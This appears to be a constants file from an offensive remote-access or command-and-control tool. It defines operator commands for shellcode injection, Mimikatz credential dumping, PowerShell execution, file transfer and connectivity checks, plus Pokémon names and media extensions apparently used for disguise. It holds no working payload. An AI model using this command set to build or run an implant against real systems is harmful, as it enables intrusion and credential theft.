# -*- coding: UTF-8 -*-

import enum


class ControlFlag(enum.IntEnum):
    EXIT = 99
    KEEP_CONNECTION = 100

    KILL_THREAD = 0
    KILL_PROCESS = 1
    EXECUTE_COMMAND = 2
    PUTTY = 3
    LIST_FILES = 4
    DOWNLOAD_FILE = 5
    UPLOAD_FILE = 6
    GET_CURRENT_DIR = 7
    SET_CURRENT_DIR = 8
    LIST_PROCESSES = 9
    EXECUTE_QUICK_COMMAND = 10

    SHELLCODE = 21
    SHELLCODE64 = 22
    SHELLCODE_TOKEN = 23
    SHELLCODE_TOKEN64 = 24
    SHELLCODE_INJECT = 25
    SHELLCODE_INJECT64 = 26
    SHELLCODE_LOCAL = 27
    SHELLCODE_LOCAL64 = 28

    MIMIKATZ = 41
    LOCAL_MIMIKATZ = 42

    POWERSHELL = 61
    LOCAL_POWERSHELL = 62
    POWERSHELL_FILE = 63
    LOCAL_POWERSHELL_FILE = 64

    CHECK_HTTP = 71
    CHECK_DNS = 72
    CHECK_ICMP = 73
    CHECK_TCP = 74
    CHECK_DNS_LOCAL = 75


INTRO = """
              $$\\ $$\\                          $$\\                 
              \\__|$$ |                         $$ |                
     $$$$$$\\  $$\\ $$ |  $$\\ $$$$$$\\   $$$$$$$\\ $$$$$$$\\  $$\\   $$\\ 
    $$  __$$\\ $$ |$$ | $$  |\\____$$\\ $$  _____|$$  __$$\\ $$ |  $$ |
    $$ /  $$ |$$ |$$$$$$  / $$$$$$$ |$$ /      $$ |  $$ |$$ |  $$ |
    $$ |  $$ |$$ |$$  _$$< $$  __$$ |$$ |      $$ |  $$ |$$ |  $$ |
    $$$$$$$  |$$ |$$ | \\$$\\\\$$$$$$$ |\\$$$$$$$\\ $$ |  $$ |\\$$$$$$  |
    $$  ____/ \\__|\\__|  \\__|\\_______| \\_______|\\__|  \\__| \\______/ 
    $$ |                                                           
    $$ |                                                           
    \\__|    "Everybody makes a wrong turn once in a while" - Ash Ketchum

"""

ERROR_CODES = {
    0: "ERROR_SUCCESS",
    1: "ERROR_INVALID_FUNCTION",
    2: "ERROR_FILE_NOT_FOUND",
    3: "ERROR_PATH_NOT_FOUND",
    4: "ERROR_TOO_MANY_OPEN_FILES",
    5: "ERROR_ACCESS_DENIED",
    14: "ERROR_OUT_OF_MEMORY",
    80: "ERROR_FILE_EXISTS",
    87: "ERROR_INVALID_PARAMETER",
    123: "ERROR_INVALID_NAME",
}

EXTENSION_LIST = [
    "mp3", "avi", "mp4", "jpeg", "jpg", "png", "wav", "3gp", "mpeg", "mpg",
    "wmv"
]

NAME_LIST = [
    'abomasnow', 'abomasnowmega', 'abra', 'absol', 'absolmega', 'accelgor',
    'aegislashblade', 'aegislashshield', 'aerodactyl', 'aerodactylmega',
    'aggron', 'aggronmega', 'aipom', 'alakazam', 'alakazammega', 'alomomola',
    'altaria', 'altariamega', 'amaura', 'ambipom', 'amoonguss', 'ampharos',
    'ampharosmega', 'anorith', 'araquanid', 'araquanidtotem', 'arbok',
    'arcanine', 'arceus', 'archen', 'archeops', 'ariados', 'armaldo',
    'aromatisse', 'aron', 'articuno', 'audino', 'audinomega', 'aurorus',
    'avalugg', 'axew', 'azelf', 'azumarill', 'azurill', 'bagon', 'baltoy',
    'banette', 'banettemega', 'barbaracle', 'barboach', 'basculinbluestriped',
    'basculinredstriped', 'bastiodon', 'bayleef', 'beartic', 'beautifly',
    'beedrill', 'beedrillmega', 'beheeyem', 'beldum', 'bellossom', 'bellsprout',
    'bergmite', 'bewear', 'bibarel', 'bidoof', 'binacle', 'bisharp',
    'blacephalon', 'blastoise', 'blastoisemega', 'blaziken', 'blazikenmega',
    'blissey', 'blitzle', 'boldore', 'bonsly', 'bouffalant', 'bounsweet',
    'braixen', 'braviary', 'breloom', 'brionne', 'bronzong', 'bronzor',
    'bruxish', 'budew', 'buizel', 'bulbasaur', 'buneary', 'bunnelby', 'burmy',
    'butterfree', 'buzzwole', 'cacnea', 'cacturne', 'camerupt', 'cameruptmega',
    'carbink', 'carnivine', 'carracosta', 'carvanha', 'cascoon', 'castform',
    'castformrainy', 'castformsnowy', 'castformsunny', 'caterpie', 'celebi',
    'celesteela', 'chandelure', 'chansey', 'charizard', 'charizardmegax',
    'charizardmegay', 'charjabug', 'charmander', 'charmeleon', 'chatot',
    'cherrim', 'cherubi', 'chesnaught', 'chespin', 'chikorita', 'chimchar',
    'chimecho', 'chinchou', 'chingling', 'cinccino', 'clamperl', 'clauncher',
    'clawitzer', 'claydol', 'clefable', 'clefairy', 'cleffa', 'cloyster',
    'cobalion', 'cofagrigus', 'combee', 'combusken', 'comfey', 'conkeldurr',
    'corphish', 'corsola', 'cosmoem', 'cosmog', 'cottonee', 'crabominable',
    'crabrawler', 'cradily', 'cranidos', 'crawdaunt', 'cresselia', 'croagunk',
    'crobat', 'croconaw', 'crustle', 'cryogonal', 'cubchoo', 'cubone',
    'cutiefly', 'cyndaquil', 'darkrai', 'darmanitanstandard', 'darmanitanzen',
    'dartrix', 'darumaka', 'decidueye', 'dedenne', 'deerling', 'deino',
    'delcatty', 'delibird', 'delphox', 'deoxysattack', 'deoxysdefense',
    'deoxysnormal', 'deoxysspeed', 'dewgong', 'dewott', 'dewpider', 'dhelmise',
    'dialga', 'diancie', 'dianciemega', 'diggersby', 'diglett', 'diglettalola',
    'ditto', 'dodrio', 'doduo', 'donphan', 'doublade', 'dragalge', 'dragonair',
    'dragonite', 'drampa', 'drapion', 'dratini', 'drifblim', 'drifloon',
    'drilbur', 'drowzee', 'druddigon', 'ducklett', 'dugtrio', 'dugtrioalola',
    'dunsparce', 'duosion', 'durant', 'dusclops', 'dusknoir', 'duskull',
    'dustox', 'dwebble', 'eelektrik', 'eelektross', 'eevee', 'ekans',
    'electabuzz', 'electivire', 'electrike', 'electrode', 'elekid', 'elgyem',
    'emboar', 'emolga', 'empoleon', 'entei', 'escavalier', 'espeon', 'espurr',
    'excadrill', 'exeggcute', 'exeggutor', 'exeggutoralola', 'exploud',
    'farfetchd', 'fearow', 'feebas', 'fennekin', 'feraligatr', 'ferroseed',
    'ferrothorn', 'finneon', 'flaaffy', 'flabebe', 'flareon', 'fletchinder',
    'fletchling', 'floatzel', 'floette', 'floetteeternal', 'florges', 'flygon',
    'fomantis', 'foongus', 'forretress', 'fraxure', 'frillish', 'froakie',
    'frogadier', 'froslass', 'furfrou', 'furret', 'gabite', 'gallade',
    'gallademega', 'galvantula', 'garbodor', 'garchomp', 'garchompmega',
    'gardevoir', 'gardevoirmega', 'gastly', 'gastrodon', 'genesect', 'gengar',
    'gengarmega', 'geodude', 'geodudealola', 'gible', 'gigalith', 'girafarig',
    'giratinaaltered', 'giratinaorigin', 'glaceon', 'glalie', 'glaliemega',
    'glameow', 'gligar', 'gliscor', 'gloom', 'gogoat', 'golbat', 'goldeen',
    'golduck', 'golem', 'golemalola', 'golett', 'golisopod', 'golurk', 'goodra',
    'goomy', 'gorebyss', 'gothita', 'gothitelle', 'gothorita',
    'gourgeistaverage', 'gourgeistlarge', 'gourgeistsmall', 'gourgeistsuper',
    'granbull', 'graveler', 'graveleralola', 'greninja', 'greninjaash',
    'greninjabattlebond', 'grimer', 'grimeralola', 'grotle', 'groudon',
    'groudonprimal', 'grovyle', 'growlithe', 'grubbin', 'grumpig', 'gulpin',
    'gumshoos', 'gumshoostotem', 'gurdurr', 'guzzlord', 'gyarados',
    'gyaradosmega', 'hakamoo', 'happiny', 'hariyama', 'haunter', 'hawlucha',
    'haxorus', 'heatmor', 'heatran', 'heliolisk', 'helioptile', 'heracross',
    'heracrossmega', 'herdier', 'hippopotas', 'hippowdon', 'hitmonchan',
    'hitmonlee', 'hitmontop', 'honchkrow', 'honedge', 'hooh', 'hoopa',
    'hoopaunbound', 'hoothoot', 'hoppip', 'horsea', 'houndoom', 'houndoommega',
    'houndour', 'huntail', 'hydreigon', 'hypno', 'igglybuff', 'illumise',
    'incineroar', 'infernape', 'inkay', 'ivysaur', 'jangmoo', 'jellicent',
    'jigglypuff', 'jirachi', 'jolteon', 'joltik', 'jumpluff', 'jynx', 'kabuto',
    'kabutops', 'kadabra', 'kakuna', 'kangaskhan', 'kangaskhanmega',
    'karrablast', 'kartana', 'kecleon', 'keldeoordinary', 'keldeoresolute',
    'kingdra', 'kingler', 'kirlia', 'klang', 'klefki', 'klink', 'klinklang',
    'koffing', 'komala', 'kommoo', 'kommoototem', 'krabby', 'kricketot',
    'kricketune', 'krokorok', 'krookodile', 'kyogre', 'kyogreprimal', 'kyurem',
    'kyuremblack', 'kyuremwhite', 'lairon', 'lampent', 'landorusincarnate',
    'landorustherian', 'lanturn', 'lapras', 'larvesta', 'larvitar', 'latias',
    'latiasmega', 'latios', 'latiosmega', 'leafeon', 'leavanny', 'ledian',
    'ledyba', 'lickilicky', 'lickitung', 'liepard', 'lileep', 'lilligant',
    'lillipup', 'linoone', 'litleo', 'litten', 'litwick', 'lombre', 'lopunny',
    'lopunnymega', 'lotad', 'loudred', 'lucario', 'lucariomega', 'ludicolo',
    'lugia', 'lumineon', 'lunala', 'lunatone', 'lurantis', 'lurantistotem',
    'luvdisc', 'luxio', 'luxray', 'lycanrocdusk', 'lycanrocmidday',
    'lycanrocmidnight', 'machamp', 'machoke', 'machop', 'magby', 'magcargo',
    'magearna', 'magearnaoriginal', 'magikarp', 'magmar', 'magmortar',
    'magnemite', 'magneton', 'magnezone', 'makuhita', 'malamar', 'mamoswine',
    'manaphy', 'mandibuzz', 'manectric', 'manectricmega', 'mankey', 'mantine',
    'mantyke', 'maractus', 'mareanie', 'mareep', 'marill', 'marowak',
    'marowakalola', 'marowaktotem', 'marshadow', 'marshtomp', 'masquerain',
    'mawile', 'mawilemega', 'medicham', 'medichammega', 'meditite', 'meganium',
    'meloettaaria', 'meloettapirouette', 'meowsticfemale', 'meowsticmale',
    'meowth', 'meowthalola', 'mesprit', 'metagross', 'metagrossmega', 'metang',
    'metapod', 'mew', 'mewtwo', 'mewtwomegax', 'mewtwomegay', 'mienfoo',
    'mienshao', 'mightyena', 'milotic', 'miltank', 'mimejr', 'mimikyubusted',
    'mimikyudisguised', 'mimikyutotembusted', 'mimikyutotemdisguised',
    'minccino', 'miniorblue', 'miniorbluemeteor', 'miniorgreen',
    'miniorgreenmeteor', 'miniorindigo', 'miniorindigometeor', 'miniororange',
    'miniororangemeteor', 'miniorred', 'miniorredmeteor', 'miniorviolet',
    'miniorvioletmeteor', 'minioryellow', 'minioryellowmeteor', 'minun',
    'misdreavus', 'mismagius', 'moltres', 'monferno', 'morelull', 'mothim',
    'mrmime', 'mudbray', 'mudkip', 'mudsdale', 'muk', 'mukalola', 'munchlax',
    'munna', 'murkrow', 'musharna', 'naganadel', 'natu', 'necrozma',
    'necrozmadawn', 'necrozmadusk', 'necrozmaultra', 'nidoking', 'nidoqueen',
    'nidoranf', 'nidoranm', 'nidorina', 'nidorino', 'nihilego', 'nincada',
    'ninetales', 'ninetalesalola', 'ninjask', 'noctowl', 'noibat', 'noivern',
    'nosepass', 'numel', 'nuzleaf', 'octillery', 'oddish', 'omanyte', 'omastar',
    'onix', 'oranguru', 'oricoriobaile', 'oricoriopau', 'oricoriopompom',
    'oricoriosensu', 'oshawott', 'pachirisu', 'palkia', 'palossand',
    'palpitoad', 'pancham', 'pangoro', 'panpour', 'pansage', 'pansear', 'paras',
    'parasect', 'passimian', 'patrat', 'pawniard', 'pelipper', 'persian',
    'persianalola', 'petilil', 'phanpy', 'phantump', 'pheromosa', 'phione',
    'pichu', 'pidgeot', 'pidgeotmega', 'pidgeotto', 'pidgey', 'pidove',
    'pignite', 'pikachu', 'pikachualolacap', 'pikachubelle', 'pikachucosplay',
    'pikachuhoenncap', 'pikachukaloscap', 'pikachulibre', 'pikachuoriginalcap',
    'pikachupartnercap', 'pikachuphd', 'pikachupopstar', 'pikachurockstar',
    'pikachusinnohcap', 'pikachuunovacap', 'pikipek', 'piloswine', 'pineco',
    'pinsir', 'pinsirmega', 'piplup', 'plusle', 'poipole', 'politoed',
    'poliwag', 'poliwhirl', 'poliwrath', 'ponyta', 'poochyena', 'popplio',
    'porygon', 'porygon2', 'porygonz', 'primarina', 'primeape', 'prinplup',
    'probopass', 'psyduck', 'pumpkabooaverage', 'pumpkaboolarge',
    'pumpkaboosmall', 'pumpkaboosuper', 'pupitar', 'purrloin', 'purugly',
    'pyroar', 'pyukumuku', 'quagsire', 'quilava', 'quilladin', 'qwilfish',
    'raichu', 'raichualola', 'raikou', 'ralts', 'rampardos', 'rapidash',
    'raticate', 'raticatealola', 'raticatetotemalola', 'rattata',
    'rattataalola', 'rayquaza', 'rayquazamega', 'regice', 'regigigas',
    'regirock', 'registeel', 'relicanth', 'remoraid', 'reshiram', 'reuniclus',
    'rhydon', 'rhyhorn', 'rhyperior', 'ribombee', 'ribombeetotem', 'riolu',
    'rockruff', 'rockruffowntempo', 'roggenrola', 'roselia', 'roserade',
    'rotom', 'rotomfan', 'rotomfrost', 'rotomheat', 'rotommow', 'rotomwash',
    'rowlet', 'rufflet', 'sableye', 'sableyemega', 'salamence', 'salamencemega',
    'salandit', 'salazzle', 'salazzletotem', 'samurott', 'sandile', 'sandshrew',
    'sandshrewalola', 'sandslash', 'sandslashalola', 'sandygast', 'sawk',
    'sawsbuck', 'scatterbug', 'sceptile', 'sceptilemega', 'scizor',
    'scizormega', 'scolipede', 'scrafty', 'scraggy', 'scyther', 'seadra',
    'seaking', 'sealeo', 'seedot', 'seel', 'seismitoad', 'sentret', 'serperior',
    'servine', 'seviper', 'sewaddle', 'sharpedo', 'sharpedomega', 'shayminland',
    'shayminsky', 'shedinja', 'shelgon', 'shellder', 'shellos', 'shelmet',
    'shieldon', 'shiftry', 'shiinotic', 'shinx', 'shroomish', 'shuckle',
    'shuppet', 'sigilyph', 'silcoon', 'silvally', 'simipour', 'simisage',
    'simisear', 'skarmory', 'skiddo', 'skiploom', 'skitty', 'skorupi', 'skrelp',
    'skuntank', 'slaking', 'slakoth', 'sliggoo', 'slowbro', 'slowbromega',
    'slowking', 'slowpoke', 'slugma', 'slurpuff', 'smeargle', 'smoochum',
    'sneasel', 'snivy', 'snorlax', 'snorunt', 'snover', 'snubbull', 'solgaleo',
    'solosis', 'solrock', 'spearow', 'spewpa', 'spheal', 'spinarak', 'spinda',
    'spiritomb', 'spoink', 'spritzee', 'squirtle', 'stakataka', 'stantler',
    'staraptor', 'staravia', 'starly', 'starmie', 'staryu', 'steelix',
    'steelixmega', 'steenee', 'stoutland', 'stufful', 'stunfisk', 'stunky',
    'sudowoodo', 'suicune', 'sunflora', 'sunkern', 'surskit', 'swablu',
    'swadloon', 'swalot', 'swampert', 'swampertmega', 'swanna', 'swellow',
    'swinub', 'swirlix', 'swoobat', 'sylveon', 'taillow', 'talonflame',
    'tangela', 'tangrowth', 'tapubulu', 'tapufini', 'tapukoko', 'tapulele',
    'tauros', 'teddiursa', 'tentacool', 'tentacruel', 'tepig', 'terrakion',
    'throh', 'thundurusincarnate', 'thundurustherian', 'timburr', 'tirtouga',
    'togedemaru', 'togedemarutotem', 'togekiss', 'togepi', 'togetic', 'torchic',
    'torkoal', 'tornadusincarnate', 'tornadustherian', 'torracat', 'torterra',
    'totodile', 'toucannon', 'toxapex', 'toxicroak', 'tranquill', 'trapinch',
    'treecko', 'trevenant', 'tropius', 'trubbish', 'trumbeak', 'tsareena',
    'turtonator', 'turtwig', 'tympole', 'tynamo', 'typenull', 'typhlosion',
    'tyranitar', 'tyranitarmega', 'tyrantrum', 'tyrogue', 'tyrunt', 'umbreon',
    'unfezant', 'unown', 'ursaring', 'uxie', 'vanillish', 'vanillite',
    'vanilluxe', 'vaporeon', 'venipede', 'venomoth', 'venonat', 'venusaur',
    'venusaurmega', 'vespiquen', 'vibrava', 'victini', 'victreebel', 'vigoroth',
    'vikavolt', 'vikavolttotem', 'vileplume', 'virizion', 'vivillon', 'volbeat',
    'volcanion', 'volcarona', 'voltorb', 'vullaby', 'vulpix', 'vulpixalola',
    'wailmer', 'wailord', 'walrein', 'wartortle', 'watchog', 'weavile',
    'weedle', 'weepinbell', 'weezing', 'whimsicott', 'whirlipede', 'whiscash',
    'whismur', 'wigglytuff', 'wimpod', 'wingull', 'wishiwashischool',
    'wishiwashisolo', 'wobbuffet', 'woobat', 'wooper', 'wormadamplant',
    'wormadamsandy', 'wormadamtrash', 'wurmple', 'wynaut', 'xatu', 'xerneas',
    'xurkitree', 'yamask', 'yanma', 'yanmega', 'yungoos', 'yveltal', 'zangoose',
    'zapdos', 'zebstrika', 'zekrom', 'zeraora', 'zigzagoon', 'zoroark', 'zorua',
    'zubat', 'zweilous', 'zygarde', 'zygarde10', 'zygarde50', 'zygardecomplete'
]
